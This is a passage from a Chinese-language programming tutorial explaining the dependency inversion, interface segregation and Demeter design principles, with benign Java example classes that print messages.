class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// interface ITV &#123; //ITV接口</span><br><span class="hljs-comment">// public void play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// class OpenAndClose implements IOpenAndClose&#123;</span><br><span class="hljs-comment">// public ITV tv; //成员</span><br><span class="hljs-comment">// public OpenAndClose(ITV tv)&#123; //构造器</span><br><span class="hljs-comment">// this.tv = tv;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// public void open()&#123;</span><br><span class="hljs-comment">// this.tv.play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><br><br><span class="hljs-comment">// 方式3 , 通过setter方法传递</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IOpenAndClose</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 抽象方法</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTv</span><span class="hljs-params">(ITV tv)</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITV</span> &#123; <span class="hljs-comment">// ITV接口</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenAndClose</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IOpenAndClose</span> &#123;<br>   <span class="hljs-keyword">private</span> ITV tv;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTv</span><span class="hljs-params">(ITV tv)</span> &#123;<br>      <span class="hljs-built_in">this</span>.tv = tv;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">this</span>.tv.play();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChangHong</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITV</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;长虹电视机，打开&quot;</span>);<br>   &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="依赖倒转原则的注意事项和细节"><a class="markdownIt-Anchor" href="#依赖倒转原则的注意事项和细节"></a> 依赖倒转原则的注意事项和细节</h3><ol><li><p>低层模块尽量都要有抽象类或接口，或者两者都有，程序稳定性更好.</p></li><li><p>变量的<strong>声明类型尽量是抽象类或接口</strong>, 这样我们的变量引用和实际对象间，就存在<strong>一个缓冲层</strong>，利于程序扩展和优化</p></li><li><p>继承时遵循<strong>里氏替换</strong>原则</p></li></ol><h2 id="4-接口隔离原则interface-segregation-principle"><a class="markdownIt-Anchor" href="#4-接口隔离原则interface-segregation-principle"></a> <strong>4、接口隔离原则（Interface Segregation Principle）</strong></h2><p>这个原则的意思是：使用多个隔离的接口，比使用单个接口要好。它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108200601362.png" alt="image-20230108200601362" /></p><ol><li><p>类 A 通过接口 Interface1 依赖类 B，类 C 通过接口 Interface1 依赖类 D，如果接口 Interface1 对于类 A 和类 C来说不是最小接口，那么类 B 和类 D 必须去实现他们不需要的方法。</p></li><li><p>按隔离原则应当这样处理：</p></li></ol><p><strong>将接口 Interface1</strong> 拆分为<strong>独立的几个接口(这里我们拆分成 3 个接口)</strong>，类 A 和类 C 分别与他们需要的接口建立依赖关系。也就是采用接口隔离原则</p><p><code>Segregation1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.segregation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segregation1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation1&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation2&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation3&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation4&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation1&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation2&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation3&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation4&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-comment">//A 类通过接口Interface1 依赖(使用) B类，但是只会用到1,2,3方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend2</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation2();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend3</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation3();<br>   &#125;<br>&#125;<br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123; <span class="hljs-comment">//C 类通过接口Interface1 依赖(使用) D类，但是只会用到1,4,5方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend4</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation4();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend5</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation5();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Segregation1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.segregation.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segregation1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 使用一把</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      a.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>()); <span class="hljs-comment">// A类通过接口去依赖B类</span><br>      a.depend2(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br>      a.depend3(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br><br>      <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br><br>      c.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>()); <span class="hljs-comment">// C类通过接口去依赖(使用)D类</span><br>      c.depend4(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br>      c.depend5(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// 接口1</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span>;<br><br>&#125;<br><br><span class="hljs-comment">// 接口2</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface2</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">// 接口3</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface3</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface2 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation2&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation3&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface3 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation4&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-comment">// A 类通过接口Interface1,Interface2 依赖(使用) B类，但是只会用到1,2,3方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend2</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation2();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend3</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation3();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123; <span class="hljs-comment">// C 类通过接口Interface1,Interface3 依赖(使用) D类，但是只会用到1,4,5方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend4</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation4();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend5</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation5();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="应传统方法的问题和使用接口隔离原则改进"><a class="markdownIt-Anchor" href="#应传统方法的问题和使用接口隔离原则改进"></a> 应传统方法的问题和使用接口隔离原则改进</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108201003713.png" alt="image-20230108201003713" /></p><ol><li><p>类 A 通过接口 Interface1 依赖类 B，类 C 通过接口 Interface1 依赖类 D，如果接口 Interface1 对于类 A 和类 C来说不是最小接口，那么类 B 和类 D 必须去实现他们不需要的方法</p></li><li><p>将接口 <strong>Interface1 拆分为独立的几个接口</strong>，类 A 和类 C 分别与他们需要的接口建立依赖关系。也就是采用接口隔离原则</p></li><li><p>接口 Interface1 中出现的方法，根据实际情况拆分为<strong>三个</strong>接口</p></li><li><p><code>Segregation1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.segregation.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segregation1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 使用一把</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      a.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>()); <span class="hljs-comment">// A类通过接口去依赖B类</span><br>      a.depend2(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br>      a.depend3(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>());<br><br>      <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br><br>      c.depend1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>()); <span class="hljs-comment">// C类通过接口去依赖(使用)D类</span><br>      c.depend4(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br>      c.depend5(<span class="hljs-keyword">new</span> <span class="hljs-title class_">D</span>());<br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// 接口1</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span>;<br><br>&#125;<br><br><span class="hljs-comment">// 接口2</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface2</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-comment">// 接口3</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface3</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span>;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface2 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation2&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B 实现了 operation3&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span>, Interface3 &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation1&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation4&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D 实现了 operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-comment">// A 类通过接口Interface1,Interface2 依赖(使用) B类，但是只会用到1,2,3方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend2</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation2();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend3</span><span class="hljs-params">(Interface2 i)</span> &#123;<br>      i.operation3();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123; <span class="hljs-comment">// C 类通过接口Interface1,Interface3 依赖(使用) D类，但是只会用到1,4,5方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend4</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation4();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend5</span><span class="hljs-params">(Interface3 i)</span> &#123;<br>      i.operation5();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="5-迪米特法则又称最少知道原则demeter-principle"><a class="markdownIt-Anchor" href="#5-迪米特法则又称最少知道原则demeter-principle"></a> <strong>5、迪米特法则，又称最少知道原则（Demeter Principle）</strong></h2><p>最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。</p><ol><li><p>一个对象应该对其他对象保持最少的了解</p></li><li><p>类与类关系越密切，耦合度越大</p></li><li><p>迪米特法则(Demeter Principle)又叫<strong>最少知道原则</strong>，即一个类<strong>对自己依赖的类知道的越少越好</strong>。也就是说，对于被依赖的类不管多么复杂，都尽量将逻辑封装在类的内部。对外除了提供的 public 方法，不对外泄露任何信息</p></li><li><p>迪米特法则还有个更简单的定义：只与直接的朋友通信</p></li><li><p><strong>直接的朋友</strong>：每个对象都会与其他对象有<strong>耦合关系</strong>，只要两个对象之间有耦合关系，我们就说这两个对象之间是朋友关系。耦合的方式很多，依赖，关联，组合，聚合等。其中，我们称出现<strong>成员变量</strong>，<strong>方法参数</strong>，<strong>方法返</strong>回值中的类为直接的朋友，而出现在<strong>局部变量中的类不是直接的朋友</strong>。也就是说，陌生的类最好不要以局部变量的形式出现在类的内部。</p></li></ol><h3 id="应用实例"><a class="markdownIt-Anchor" href="#应用实例"></a> 应用实例</h3><ol><li>有一个学校，下属有各个学院和总部，现要求打印出学校总部员工 ID 和学院员工的 id</li></ol><p><img 